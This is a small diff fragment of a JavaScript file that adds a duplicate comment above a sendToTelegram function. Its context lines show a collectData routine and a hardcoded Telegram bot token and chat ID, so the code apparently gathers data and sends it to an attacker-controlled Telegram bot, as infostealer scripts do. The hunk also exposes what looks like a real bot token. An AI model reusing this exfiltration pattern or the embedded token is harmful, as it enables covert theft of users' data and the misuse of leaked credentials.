@@ -93,6 +93,7 @@ async function collectData() {
 }
 // Send collected data to Telegram
 // Send collected data to Telegram
+// Send collected data to Telegram
 function sendToTelegram(data) {
     const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
     const chatId = "6107520820"; // Your chat ID
